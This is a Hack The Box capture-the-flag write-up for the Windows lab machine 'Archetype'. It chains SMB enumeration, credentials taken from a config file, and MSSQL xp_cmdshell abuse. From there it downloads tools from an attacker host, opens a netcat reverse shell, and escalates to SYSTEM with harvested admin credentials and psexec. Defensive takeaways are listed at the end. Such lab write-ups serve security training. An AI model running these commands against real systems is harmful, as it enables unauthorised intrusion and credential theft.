# 📄 HTB: Archetype — Writeup

## 🧠 Overview

* **Machine Name:** Archetype
* **Difficulty:** Easy (Tier II)
* **Platform:** Hack The Box
* **OS:** Windows
* **Key Concepts:**

  * SMB enumeration (null session)
  * Credential extraction from config files
  * MSSQL exploitation
  * xp_cmdshell abuse for RCE
  * Privilege escalation via PowerShell history

---

## 🧭 Enumeration

### 🔎 Nmap Scan

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

### 📌 Key Findings

* **445/tcp → SMB**
* **1433/tcp → Microsoft SQL Server 2017**

👉 Insight:
SMB + MSSQL combo often leads to credential exposure → DB access → RCE

---

## 📂 SMB Enumeration

### 🔍 Null Session Enumeration

```bash
smbclient -N -L \\<TARGET_IP>\
```

### 📌 Shares Found

* `ADMIN$` → Access Denied
* `C$` → Access Denied
* `backups` → Accessible ✅

---

### 📥 Access backups Share

```bash
smbclient -N \\<TARGET_IP>\backups
```

### 📄 Files Found

* `prod.dtsConfig`

Download:

```bash
get prod.dtsConfig
```

---

## 🔑 Credential Discovery

### 🔍 Inspect File

```bash
cat prod.dtsConfig
```

### 📌 Credentials Found

* **Username:** `sql_svc`
* **Password:** `M3g4c0rp123`

👉 Insight:
`.dtsConfig` = SQL Server Integration Services config → likely MSSQL credentials

---

## 🧠 Thought Process Pivot

1. File contains SQL-related config
2. MSSQL service is exposed (port 1433)
3. Credentials likely valid for database access
4. Try connecting to MSSQL

---

## 🧰 MSSQL Access

### ❌ Attempt (SQL Auth — may fail)

```bash
sqsh -S <TARGET_IP> -U sql_svc -P M3g4c0rp123
```

### 🧠 Reasoning

* Failure suggests **Windows Authentication required**

---

### ✅ Working Method (Impacket)

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth
```

✔ Successfully authenticated 

---

## ⚡ Foothold — Command Execution

### 🔍 Check Privileges

```sql
SELECT is_srvrolemember('sysadmin');
```

✔ Output: `1` → sysadmin privileges

---

### ❌ xp_cmdshell Disabled

### ✅ Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

### 💻 Execute Commands

```sql
EXEC xp_cmdshell 'whoami';
```

✔ OS-level command execution achieved

---

## 🖥️ Reverse Shell

### 🔧 Attacker Setup

```bash
python3 -m http.server 80
nc -lvnp 443
```

---

### 📥 Upload Netcat

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<ATTACKER_IP>/nc64.exe -outfile nc64.exe"
```

---

### 🔁 Execute Reverse Shell

```sql
xp_cmdshell "C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe <ATTACKER_IP> 443"
```

✔ Reverse shell obtained 

---

## 🚩 User Flag

```bash
C:\Users\sql_svc\Desktop\
```

---

## 🔼 Privilege Escalation

### 🧰 Upload winPEAS

```bash
python3 -m http.server 80
```

```powershell
wget http://<ATTACKER_IP>/winPEASx64.exe -outfile winPEASx64.exe
```

Run:

```powershell
.\winPEASx64.exe
```

---

### 🔍 Findings

* `SeImpersonatePrivilege`
* PowerShell history file

---

## 🔑 Credential Harvesting

### 📄 File Location

```bash
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

### 📌 Contents

```bash
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

✔ Admin password found 

---

## 👑 Administrator Access

### 🧰 Use psexec

```bash
python3 psexec.py administrator@<TARGET_IP>
```

✔ SYSTEM shell obtained

---

## 🏁 Root Flag

```bash
C:\Users\Administrator\Desktop\
```

---

# 🧩 Key Takeaways

## 🔐 Credential Exposure

* Config files often store plaintext credentials

## 🧠 Service Mapping

* Match credentials → service → protocol

## ⚡ MSSQL Abuse

* `xp_cmdshell` = direct OS command execution

## 📂 Weak Operational Security

* PowerShell history leaking admin credentials

## 🔁 Credential Reuse

* Service account → Administrator pivot

---

# 🚨 Defensive Measures

* Disable SMB null sessions
* Secure configuration files
* Disable xp_cmdshell
* Monitor PowerShell logs
* Enforce credential hygiene

---

# 🧠 Final Attack Chain

```text
SMB → backups share → config file → creds
→ MSSQL login → enable xp_cmdshell
→ reverse shell → winPEAS
→ PowerShell history → admin creds
→ psexec → SYSTEM
```

---
